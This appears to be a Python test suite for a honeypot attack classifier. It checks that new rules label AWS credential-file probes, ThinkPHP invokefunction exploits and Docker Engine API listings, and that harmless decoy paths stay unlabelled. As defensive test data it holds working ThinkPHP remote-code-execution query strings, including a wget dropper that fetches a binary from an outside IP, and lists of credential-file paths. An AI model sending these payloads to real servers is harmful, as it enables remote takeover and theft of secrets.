"""The four shapes that matched NOTHING in the registry, measured 2026-11-08.

Each case below was run against the live registry before the rules existed and came back with
no hit at all -- not the family verdict, not even `SCANNER` -- while the neighbouring shape the
registry *does* cover (`GET /.env`, `GET /.git/config`) matched three rules plus `SCANNER`.
Scope over 30 days on the reachable fleet: 3,605 candidate rows, 3,288 of them with no verdict.

The miss hid behind multi-path sweepers. A scanner that asks for `.env` in the same run earns
`SENSITIVE_FILE` from *that* request, so the `.aws` rows beside it looked labelled whenever the
count was taken per source instead of per row. One actor that asked for nothing else --
~100 requests to a single path on each of three sensors -- is what made it visible.

Every payload and metadata shape here is taken from the store, not invented: the decoys do not
agree on one shape, and the classifier matches each rule against each target separately, so a
test written only against the payload summary line would pass while the real rows went
unlabelled.
"""

from __future__ import annotations

from honeylens.classification.attack_classifier import classify_event_row
from honeylens.classification.scoring import get_severity

# `classify_event_row` returns [] for a falsy payload, so there is no such thing as a
# metadata-only classification -- every realistic row carries either the decoy's JSON summary
# line or a captured request body. Tests that passed "" here failed for that reason and not
# because of the rules, so the helpers below build the two shapes the store actually holds.
_BODY = "a=1&b=2"


def summary(path: str, method: str = "GET", query: str | None = None) -> str:
    """What a web decoy writes into `payload` for a request with no body."""
    q = "null" if query is None else f'"{query}"'
    return (
        f'{{"phase": "request", "method": "{method}", "path": "{path}", '
        f'"query_string": {q}, "http_version": "HTTP/1.1", "body_len": 0}}'
    )


def verdicts(payload: str, metadata: dict | None = None, protocol: str = "http") -> set[str]:
    """The verdict tokens this event earns."""
    return {
        atype for atype, _name, _snippet in classify_event_row(payload, protocol, metadata or {})
    }


def rules(payload: str, metadata: dict | None = None, protocol: str = "http") -> set[str]:
    """The rule names that fired."""
    return {
        name for _atype, name, _snippet in classify_event_row(payload, protocol, metadata or {})
    }


def by_path(path: str, query: str | None = None) -> set[str]:
    """A GET as the decoys record it: summary line in `payload`, path in `metadata`."""
    md: dict = {"path": path}
    if query is not None:
        md["query"] = query
    return verdicts(summary(path, query=query), md)


def body_post(path: str, query: str | None = None) -> set[str]:
    """A POST whose captured body REPLACES the summary line, so the path lives only in
    `metadata` -- 1,279 such rows on the netscaler decoy and 207 on honeypot-http."""
    md: dict = {"path": path, "method": "POST"}
    if query is not None:
        md["query"] = query
    return verdicts(_BODY, md)


class TestAwsCredentialFiles:
    """`~/.aws/credentials` is a long-term access key and secret in cleartext, so it belongs in
    the same class as `.env` -- which is why it reuses that verdict instead of taking a new one.
    """

    def test_the_single_path_hammer_is_now_labelled(self) -> None:
        """The shape `honeypot-http` writes: a JSON summary, path also in metadata.

        ~100 requests to this one path on each of three sensors, every one previously `(none)`.
        """
        assert "SENSITIVE_FILE" in by_path("/.aws/config")

    def test_the_path_alone_is_enough(self) -> None:
        """On the netscaler and sharepoint decoys a request with a body replaces the payload
        with the captured body, so the path exists ONLY in metadata. A rule anchored on
        `GET /` would miss every one of those rows."""
        assert "SENSITIVE_FILE" in body_post("/.aws/credentials")

    def test_every_prefixed_variant_observed_in_the_store(self) -> None:
        for path in (
            "/.aws/config",
            "/.aws/credentials",
            "/root/.aws/credentials",
            "/root/.aws/config",
            "/home/ubuntu/.aws/credentials",
            "/home/ec2-user/.aws/credentials",
            "/home/*/.aws/credentials",
            "/~/.aws/config",
            "/~/.aws/credentials",
            "/app/.aws/credentials",
            "/config/.aws/credentials",
            "/backend/.aws/credentials",
            "/s3/.aws/config",
            "/@fs/root/.aws/credentials",
            "/@fs/home/ubuntu/.aws/credentials",
        ):
            assert "SENSITIVE_FILE" in by_path(path), path
            assert "SENSITIVE_FILE" in body_post(path), path

    def test_backup_suffixes_still_match(self) -> None:
        """`\\b` after the filename, so `.bak`/`.old` are inside the rule rather than outside
        it. 59 rows in the store carry these."""
        for path in ("/.aws/credentials.bak", "/.aws/config.bak", "/.aws/credentials.old"):
            assert "SENSITIVE_FILE" in by_path(path), path

    def test_the_sso_token_cache(self) -> None:
        """`~/.aws/sso/cache/*.json` holds the SSO access token -- a live credential, not a
        config file. 5 rows on two sensors over 30 days."""
        assert "SENSITIVE_FILE" in by_path("/.aws/sso/cache/botocore-client-id.json")

    def test_the_boundary_rejects_the_near_misses(self) -> None:
        for path in ("/.aws/configuration", "/.awscredentials", "/aws/config"):
            got = by_path(path)
            assert "SENSITIVE_FILE" not in got, (path, got)

    def test_a_query_string_does_not_break_the_match(self) -> None:
        assert "SENSITIVE_FILE" in by_path("/.aws/config", query="x=1")

    def test_the_beanstalk_descriptor(self) -> None:
        """52 rows, 46 unlabelled. Carries the image reference and the environment block."""
        assert "SENSITIVE_FILE" in by_path("/Dockerrun.aws.json")

    def test_severity_matches_the_env_class_it_joined(self) -> None:
        assert get_severity("SENSITIVE_FILE", "aws_cli_credentials_file") == get_severity(
            "SENSITIVE_FILE", "lfi_sensitive_config"
        )


class TestThinkPhpInvokefunction:
    """Two rungs, the same ladder `PHP2SHELL` -> `CVE_2026_109619` uses: the shape earns the
    family verdict, and naming a function that runs a command earns RCE. 56 of 57 captured
    query strings invoke `md5`, which is the published capability check -- labelling those
    critical would claim exactly what `sp-webshell-aspx` was corrected for claiming.
    """

    MD5 = (
        "s=/index/\\think\\app/invokefunction"
        "&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello"
    )
    SYSTEM = (
        "s=/Index/\\think\\app/invokefunction"
        "&function=call_user_func_array&vars[0]=system&vars[1][]=printenv"
    )

    def test_the_capability_check_is_php_not_rce(self) -> None:
        v = by_path("/index.php", query=self.MD5)
        assert "PHP" in v
        assert "RCE" not in v

    def test_command_execution_escalates(self) -> None:
        v = by_path("/", query=self.SYSTEM)
        assert {"PHP", "RCE"} <= v

    def test_the_query_target_is_where_most_rows_carry_it(self) -> None:
        """127 of 127 rows on one sensor and 83 of 140 on another hold the exploit in
        `metadata['query']` with a bare `/index.php` path. The classifier scans that key as a
        standalone target, so the rule must match without the path attached."""
        assert "PHP" in verdicts(_BODY, {"path": "/index.php", "query": self.MD5})

    def test_the_path_form_matches_too(self) -> None:
        """57 rows on the public sensor put the whole thing in the path."""
        assert "PHP" in by_path("/public/index.php?" + self.MD5)

    def test_the_loader_shape_from_the_door_sweep(self) -> None:
        """As it arrives inside the `libredtail-http` 46-request sweep: payload summary line."""
        assert "PHP" in verdicts(
            '{"phase": "request", "method": "GET", "path": "/index.php?' + self.MD5 + '"}'
        )

    REORDERED = (
        "s=/index/\\think\\app/invokefunction&function=call_user_func_array"
        "&vars[1][]=cd%20/tmp;%20wget%20http://45.1.2.3/bins/think.x86;%20chmod%20+x%20think.x86"
        "&vars[0]=system"
    )

    def test_a_dropper_that_puts_the_command_first_still_escalates(self) -> None:
        """PHP ignores parameter order and loaders exploit that. The first version of the
        escalation rule used a bounded gap after `invokefunction`, and this shape exhausted it
        long before `vars[0]=system` -- a wget dropper scored PHP and not RCE. Anchoring on the
        parameter key instead of on proximity is what fixes it. Found by review, reproduced
        before the rewrite."""
        assert {"PHP", "RCE"} <= by_path("/index.php", query=self.REORDERED)

    def test_an_argument_that_spells_a_function_name_does_not_escalate(self) -> None:
        """`vars[0]=md5&vars[1][]=exec` is an md5 of the string "exec" -- a capability check.
        The gap-based rule escalated it to critical."""
        q = (
            "s=/index/\\think\\app/invokefunction&function=call_user_func_array"
            "&vars[0]=md5&vars[1][]=exec"
        )
        v = by_path("/index.php", query=q)
        assert "PHP" in v
        assert "RCE" not in v

    def test_the_five_one_container_variant(self) -> None:
        """ThinkPHP 5.1 routes through `\\think\\Container` rather than `\\think\\app`. Zero rows
        in the store carry it; covered because the PoC is published and an alternation branch
        costs nothing."""
        q = (
            "s=/index/\\think\\Container/invokefunction"
            "&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello"
        )
        assert "PHP" in by_path("/index.php", query=q)

    def test_the_grade_is_the_one_code_execution_takes_here(self) -> None:
        """Not a free choice: the neighbours that describe executing code are graded critical
        (`rce_eval_exec`, and the PHP2Shell ladder's own escalated rung). A review argued for
        high by analogy with an etcd key read -- which is a data read, and not this."""
        assert get_severity("RCE", "thinkphp_invokefunction_exec") == get_severity(
            "RCE", "rce_eval_exec"
        )

    def test_escalation_needs_a_command_function_not_merely_the_word(self) -> None:
        """`call_user_func_array` is present in every one of these and must not escalate on
        its own -- it contains neither `exec` nor `system`."""
        assert "RCE" not in verdicts(
            _BODY,
            {
                "path": "/index.php",
                "query": "s=/index/\\think\\app/invokefunction&function=call_user_func_array",
            },
        )


class TestDockerEngineApi:
    """Reached over TCP, unauthenticated: on a host with 2375/2376 exposed the response is the
    container inventory. Inventory is not credentials, and the request is a bare GET from
    scanner ranges, so it sits one rung below `CLOUD_ATTACK`'s default severity.
    """

    def test_the_bare_listing(self) -> None:
        assert "CLOUD_ATTACK" in by_path("/containers/json")
        assert "CLOUD_ATTACK" in body_post("/containers/json")

    def test_the_versioned_listing(self) -> None:
        """30 rows on the public sensor arrive with the API version in the path."""
        assert "CLOUD_ATTACK" in by_path("/v1.40/containers/json")
        assert "CLOUD_ATTACK" in by_path("/v1.24/images/json")

    def test_the_query_variant(self) -> None:
        assert "CLOUD_ATTACK" in by_path("/containers/json", query="all=1")

    def test_graded_below_the_family_default(self) -> None:
        """A bare GET must not read like a cluster compromise. The split from
        `CLOUD_ATTACK`'s own default is the point of the override."""
        assert get_severity("CLOUD_ATTACK", "docker_api_remote_list") == "medium"
        # The family's own default, which this rule deliberately does not take. (The IMDS
        # credential rule carries its own override to `critical`, so it is not the comparison.)
        assert get_severity("CLOUD_ATTACK", "aws_ssrf_s3") == "high"


class TestWhatMustNotChange:
    """The additions are additive. These shapes were already handled and must be untouched."""

    def test_containers_dot_env_stays_a_sensitive_file_and_gains_nothing(self) -> None:
        """`/containers/.env` is an environment file, not a Docker API call. It already earned
        `SENSITIVE_FILE`; the new Docker rule requires `json` and must not reach it."""
        v = by_path("/containers/.env")
        assert "SENSITIVE_FILE" in v
        assert "CLOUD_ATTACK" not in v
        assert "docker_api_remote_list" not in rules(
            summary("/containers/.env"), {"path": "/containers/.env"}
        )

    def test_env_aws_was_never_the_gap(self) -> None:
        """`/.env.aws` and `/.aws/.env` were always labelled -- by the `.env` pattern. That is
        why the count per source looked healthy while the `.aws` rows went unlabelled."""
        for path in ("/.env.aws", "/.aws/.env"):
            assert "SENSITIVE_FILE" in by_path(path), path

    def test_the_decoy_landing_pages_gain_no_verdict(self) -> None:
        """The paths that make up the bulk of decoy traffic. A credential or framework rule
        that fired on these would bury the signal it exists to raise."""
        for path in (
            "/",
            "/favicon.ico",
            "/robots.txt",
            "/SitePages/Home.aspx",
            "/logon/LogonPoint/tmindex.html",
            "/vpn/pluginlist.xml",
            "/wp-content/themes/twentytwentyone/style.css",
            "/app.js",
            "/images/logo.png",
            "/api/containers",
        ):
            got = by_path(path)
            assert not ({"SENSITIVE_FILE", "CLOUD_ATTACK", "PHP", "RCE"} & got), (path, got)

    def test_an_asset_path_that_merely_starts_with_json_is_not_the_docker_api(self) -> None:
        """The right boundary on the suffix, which the first version of the rule lacked.

        Without `(?![\\w.-])` the pattern earned CLOUD_ATTACK for
        `/wp-content/themes/x/images/json.png` -- the CMS decoy's own asset namespace -- and for
        `/images/json-ld.js`. An independent review found it; the first version of THIS FILE
        asserted the false positive as "accepted breadth", which is how a rationalisation gets
        frozen into a suite. No such row exists in the store today, so this pins a latent fault
        rather than a regression, and it is pinned because the shape is one theme file away.
        """
        for path in (
            "/images/json-ld.js",
            "/wp-content/themes/twentytwentyone/images/json.png",
            "/static/images/json.png",
            "/containers/jsonp",
            "/images/json_schema",
            "/api/v1/images/json.php",
        ):
            got = by_path(path)
            assert "CLOUD_ATTACK" not in got, (path, got)

    def test_the_docker_forms_that_do_arrive_still_match(self) -> None:
        """A boundary that also excluded the real traffic would be the worse bug."""
        for path in (
            "/containers/json",
            "/v1.40/containers/json",
            "/containers/json/",
            "/api/endpoints/1/docker/containers/json",
        ):
            assert "CLOUD_ATTACK" in by_path(path), path
